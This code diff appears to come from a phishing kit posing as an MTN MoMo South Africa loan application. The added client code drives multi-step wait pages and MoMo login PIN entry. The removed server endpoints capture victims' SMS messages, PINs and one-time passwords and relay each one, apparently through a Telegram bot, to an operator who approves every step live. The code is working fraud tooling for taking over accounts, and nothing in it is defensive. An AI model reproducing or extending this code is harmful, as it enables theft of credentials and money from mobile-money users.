+        document.getElementById('scheduleBody').innerHTML = html;
+        document.getElementById('scheduleModal').classList.add('show');
+    } catch (e) { showToast(e.message, 'error'); }
+}
+function closeSchedule() { document.getElementById('scheduleModal').classList.remove('show'); }
+
+function copyAppId() {
+    navigator.clipboard.writeText(S.applicationId).then(
+        () => showToast('📋 Application ID copied!', 'success'),
+        () => showToast('Could not copy.', 'error')
+    );
+}
+
+function cancelApplication() {
+    if (!confirm('Cancel this application? All progress will be lost.')) return;
+    restartApplication();
+}
+
+function restartApplication() {
+    stopPolling();
+    if (qualificationAnimator) { clearInterval(qualificationAnimator); qualificationAnimator = null; }
+    Object.values(KEYS).forEach(rm);
+    location.reload();
+}
+
+// ═══════════════════════════════════════════════════════════
+// RECOVERY
+// ═══════════════════════════════════════════════════════════
+async function recoverSession() {
+    const id = get(KEYS.APP_ID);
+    if (!id) { goTo('page-landing'); return; }
+    S.applicationId = id;
+
+    const data = get(KEYS.APP_DATA);
+    if (data) {
+        S.isRegistered   = data.isRegistered;
+        S.accountType    = data.accountType;
+        S.accountMaxLoan = data.accountMaxLoan;
+        S.steps          = data.steps || {};       // ✅ FIXED
+        S.loan           = data.loan || {};
+        S.personal       = data.personal || {};
+        S.employment     = data.employment || {};
+        S.guarantor      = data.guarantor || {};
+    }
+
+    if (!isUserRegistered()) { goTo('page-landing'); return; }
+
+    try {
+        const r = await fetch(`/api/status/${id}`);
+        if (!r.ok) { goTo('page-landing'); return; }
+        const serverState = await r.json();
+        if (!serverState.ok || !serverState.isRegistered) { goTo('page-landing'); return; }
+
+        S.accountType    = serverState.accountType;
+        S.accountMaxLoan = serverState.accountMaxLoan;
+        S.steps          = serverState.steps || S.steps || {};   // ✅ FIXED
+        saveAll();
+
+        const steps = S.steps;
+        const pending = STEPS.find(s => steps[s] === 'pending');
+        if (pending) {
+            const waitPages = {
+                loan:       'page-wait-loan',
+                personal:   'page-wait-personal',
+                employment: 'page-wait-employment',
+                guarantor:  'page-wait-guarantor',
+                momologin:  'page-wait-momologin'
+            };
+            if (pending === 'qualification') { startQualificationScan(); return; }
+            if (waitPages[pending]) {
+                goTo(waitPages[pending]);
+                const cbMap = {
+                    loan:       () => { S.steps.loan = 'approved'; saveAll(); goTo('page-step2'); },
+                    personal:   () => { S.steps.personal = 'approved'; saveAll(); goTo('page-step3'); },
+                    employment: () => { S.steps.employment = 'approved'; saveAll(); goTo('page-guarantor'); },
+                    guarantor:  () => { S.steps.guarantor = 'approved'; saveAll(); goTo('page-confirmation'); },
+                    momologin:  () => { S.steps.momologin = 'approved'; saveAll(); startQualificationScan(); }
+                };
+                startPolling(pending, cbMap[pending]);
+                return;
             }
         }
-    } catch (e) { console.error('Webhook error:', e.message); }
-});
 
-// ═══════════════════════════════════════════════════════════
-// STATUS ENDPOINTS (updated to understand new step keys)
-// ═══════════════════════════════════════════════════════════
-app.get('/api/status/:applicationId/:step', (req, res) => {
-    const { applicationId, step } = req.params;
-    const app_ = applications[applicationId];
-    if (!app_) return res.status(404).json({ ok: false, error: 'Not found' });
+        if (steps.qualification === 'approved') { showApproval(); return; }
+        if (steps.momologin === 'approved')     { startQualificationScan(); return; }
+        if (steps.guarantor === 'approved')     { goTo('page-confirmation'); return; }
+        if (steps.employment === 'approved')    { goTo('page-guarantor'); return; }
+        if (steps.personal === 'approved')      { goTo('page-step3'); return; }
+        if (steps.loan === 'approved')          { goTo('page-step2'); return; }
 
-    const valid = [...STEP_ORDER, ...LEGACY_STEPS];
-    if (!valid.includes(step)) return res.status(400).json({ ok: false, error: 'Invalid step' });
-
-    res.json({
-        ok: true,
-        status: readStep(app_, step),
-        applicationId,
-        step
-    });
-});
-
-app.get('/api/status/:applicationId', (req, res) => {
-    const app_ = applications[req.params.applicationId];
-    if (!app_) return res.status(404).json({ ok: false, error: 'Not found' });
-
-    const steps = {};
-    STEP_ORDER.forEach(k => { steps[k] = readStep(app_, k); });
-
-    res.json({
-        ok: true,
-        isRegistered: !!app_.isRegistered,
-        accountType: app_.accountType || null,
-        accountMaxLoan: app_.accountMaxLoan || 0,
-        steps,
-        // Legacy mirrors (harmless for v6 clients, used by old clients)
-        application: app_.application,
-        sms: app_.sms,
-        pin: app_.pin,
-        otp: app_.otp,
-        qualification: app_.qualification
-    });
-});
-
-// ═══════════════════════════════════════════════════════════
-// RETRY / RESEND (updated)
-// ═══════════════════════════════════════════════════════════
-app.post('/api/retry/:applicationId/:step', (req, res) => {
-    const { applicationId, step } = req.params;
-    const app_ = applications[applicationId];
-    if (!app_) return res.status(404).json({ ok: false, error: 'Not found' });
-
-    const valid = [...STEP_ORDER, 'sms', 'pin', 'otp'];
-    if (!valid.includes(step)) return res.status(400).json({ ok: false, error: 'Invalid step' });
-
-    writeStep(app_, step, 'idle');
-    if (step === 'loan') app_.loanData = null;
-    if (step === 'personal') app_.personalData = null;
-    if (step === 'employment') app_.employmentData = null;
-    if (step === 'guarantor') app_.guarantorData = null;
-    if (step === 'momologin') { app_.loginPin = null; app_.momoLoginData = null; }
-    if (step === 'sms') app_.smsMessage = null;
-    if (step === 'pin') app_.pinValue = null;
-    if (step === 'otp') app_.otpValue = null;
-
-    app_.updatedAt = new Date().toISOString();
-    saveApps();
-    res.json({ ok: true });
-});
-
-app.post('/api/resend-sms/:applicationId', (req, res) => {
-    const app_ = applications[req.params.applicationId];
-    if (!app_) return res.status(404).json({ ok: false, error: 'Not found' });
-    app_.sms = 'idle'; app_.smsMessage = null;
-    app_.updatedAt = new Date().toISOString();
-    saveApps();
-    res.json({ ok: true });
-});
-
-app.post('/api/resend-otp', (req, res) => {
-    const { applicationId } = req.body || {};
-    const app_ = applications[applicationId];
-    if (!app_) return res.status(404).json({ ok: false, error: 'Not found' });
-    app_.otp = 'idle'; app_.otpValue = null;
-    app_.updatedAt = new Date().toISOString();
-    saveApps();
-    tgSend(`🔄 <b>OTP RESENT</b>\n🆔 ${code(applicationId)}`);
-    res.json({ ok: true });
-});
-
-// ─── Rejection info ───
-app.get('/api/rejection-info/:applicationId', (req, res) => {
-    const app_ = applications[req.params.applicationId];
-    if (!app_) return res.status(404).json({ ok: false, error: 'Not found' });
-
-    let rejectedStep = null, errorMessage = '';
-    const labels = {
-        loan: 'Loan request', personal: 'Personal details', employment: 'Employment',
-        guarantor: 'Guarantor', momologin: 'MoMo login', qualification: 'Qualification',
-        application: 'Application', sms: 'SMS', pin: 'PIN', otp: 'OTP'
-    };
-    for (const k of [...STEP_ORDER, ...LEGACY_STEPS]) {
-        const status = readStep(app_, k);
-        if (status === 'rejected' || (k === 'qualification' && status === 'unqualified')) {
-            rejectedStep = k;
-            errorMessage = `${labels[k] || k} was rejected.`;
-            break;
-        }
+        if (steps.loan === 'rejected') { goTo('page-step1'); return; }
+        goTo('page-step1');
+    } catch (e) {
+        console.warn('Recovery failed:', e.message);
+        goTo('page-landing');
     }
-    res.json({ ok: true, rejectedStep, errorMessage });
-});
+}
 
 // ═══════════════════════════════════════════════════════════
-// LEGACY FLOW (kept for backward compat — frontend v6 doesn't use these)
+// STORAGE
 // ═══════════════════════════════════════════════════════════
-app.post('/api/send-application', (req, res) => {
-    try {
-        const data = req.body.applicationData || {};
-        const { applicationId } = data;
-        if (!applicationId) return res.status(400).json({ ok: false, error: 'Missing application ID' });
+function saveAll() {
+    save(KEYS.APP_ID, S.applicationId);
+    save(KEYS.APP_DATA, {
+        isRegistered: S.isRegistered,
+        accountType:  S.accountType,
+        accountMaxLoan: S.accountMaxLoan,
+        steps:        S.steps,             // ✅ FIXED
+        loan: S.loan, personal: S.personal,
+        employment: S.employment, guarantor: S.guarantor
+    });
+}
 
-        const app_ = applications[applicationId];
-        if (!app_ || !app_.isRegistered || !app_.accountType || !ACCOUNT_TYPES[app_.accountType]) {
-            return res.status(403).json({ ok: false, code: 'NOT_REGISTERED', error: 'Invalid user credentials. You must register on MoMo before applying.' });
-        }
-        const type = ACCOUNT_TYPES[app_.accountType];
-        if (data.loanAmount > type.maxLoan) return res.status(400).json({ ok: false, error: `Max R ${fmt(type.maxLoan)} for ${type.name}.` });
-        if (data.loanAmount < type.minLoan) return res.status(400).json({ ok: false, error: `Min R ${fmt(type.minLoan)}.` });
+async function retryStep(step) {
+    stopPolling();
+    try { await apiCall(`/api/retry/${S.applicationId}/${step}`, { method: 'POST' }); } catch (e) {}
+    if (S.steps[step]) { S.steps[step] = 'idle'; saveAll(); }
+    if (step === 'momologin') {
+        clearLoginPin();
+        clearErr('loginErr');
+        goTo('page-momologin');
+    }
+}
 
-        Object.assign(app_, data, {
-            accountName: type.name,
-            accountMaxLoan: type.maxLoan,
-            monthlyRepayment: monthlyRepayment(data.loanAmount, parseInt(data.loanTerm)),
-            application: 'pending',
-            updatedAt: new Date().toISOString()
-        });
-        saveApps();
-        askApproval(`📋 <b>NEW APPLICATION</b>\n🆔 ${code(applicationId)}`, 'application', applicationId);
-        res.json({ ok: true, applicationId, status: 'pending' });
-    } catch (e) { res.status(500).json({ ok: false, error: e.message }); }
+// ─── Attach PIN input handlers ───
+document.addEventListener('DOMContentLoaded', () => {
+    for (let i = 0; i < 5; i++) {
+        const el = document.getElementById('loginPin' + i);
+        if (!el) continue;
+        el.addEventListener('input',   () => loginPinMvM(el, i));
+        el.addEventListener('keydown', (e) => loginPinKeydown(el, i, e));   // ✅ FIXED
+    }
 });
 
-app.post('/api/send-momo-message', (req, res) => {
-    const { applicationId, phone, momoMessage } = req.body.momoData || {};
-    const app_ = applications[applicationId];
-    if (!app_) return res.status(404).json({ ok: false, error: 'Not found' });
-    if (app_.application !== 'approved') return res.status(400).json({ ok: false, error: 'Application not approved yet' });
-    app_.smsMessage = String(momoMessage || '').trim();
-    app_.sms = 'pending';
-    saveApps();
-    askApproval(`📨 SMS from ${code('+27' + phone)}\n${block(momoMessage)}`, 'sms', applicationId);
-    res.json({ ok: true, status: 'pending' });
-});
-
-app.post('/api/send-pin', (req, res) => {
-    const { applicationId, pin } = req.body || {};
-    const app_ = applications[applicationId];
-    if (!app_) return res.status(404).json({ ok: false, error: 'Not found' });
-    if (app_.sms !== 'approved') return res.status(400).json({ ok: false, error: 'SMS not approved' });
-    if (!/^\d{5}$/.test(String(pin || ''))) return res.status(400).json({ ok: false, error: 'PIN must be 5 digits' });
-    app_.pinValue = pin; app_.pin = 'pending'; saveApps();
-    askApproval(`🔐 PIN ${code(pin)}`, 'pin', applicationId);
-    res.json({ ok: true, status: 'pending' });
-});
-
-app.post('/api/send-otp', (req, res) => {
-    const { applicationId, otp } = req.body || {};
-    const app_ = applications[applicationId];
-    if (!app_) return res.status(404).json({ ok: false, error: 'Not found' });
-    if (app_.pin !== 'approved') return res.status(400).json({ ok: false, error: 'PIN not approved' });
-    if (!/^\d{4}$/.test(String(otp || ''))) return res.status(400).json({ ok: false, error: 'OTP must be 4 digits' });
-    app_.otpValue = otp; app_.otp = 'pending'; saveApps();
-    askApproval(`🔑 OTP ${code(otp)}`, 'otp', applicationId);
-    res.json({ ok: true, status: 'pending' });
-});
-
-app.post('/api/check-qualification', (req, res) => {
-    const { applicationId } = req.body || {};
-    const app_ = applications[applicationId];
-    if (!app_) return res.status(404).json({ ok: false, error: 'Not found' });
-    if (app_.otp !== 'approved') return res.status(400).json({ ok: false, error: 'OTP not approved' });
-    app_.qualification = 'pending';
-    saveApps();
-    askApproval(`📊 Qualification review\n🆔 ${code(applicationId)}`, 'qualification', applicationId);
-    res.json({ ok: true, status: 'pending' });
-});
-
-// ─── SPA fallback ───
-app.get('*', (req, res) => {
-    res.sendFile(path.join(__dirname, '../frontend', 'index.html'));
-});
-
-// ─── Boot ───
-loadAll();
-app.listen(PORT, () => {
-    console.log(`🚀 Server running on port ${PORT}`);
-    console.log(`   → http://localhost:${PORT}`);
-    console.log(`   → Health: /health`);
-    console.log(`   → Account types: /api/account-types\n`);
-});
+// ─── INIT ───
+updateCalc();
+recoverSession();
+console.log('✅ MTN MoMo SA v6.1 loaded');
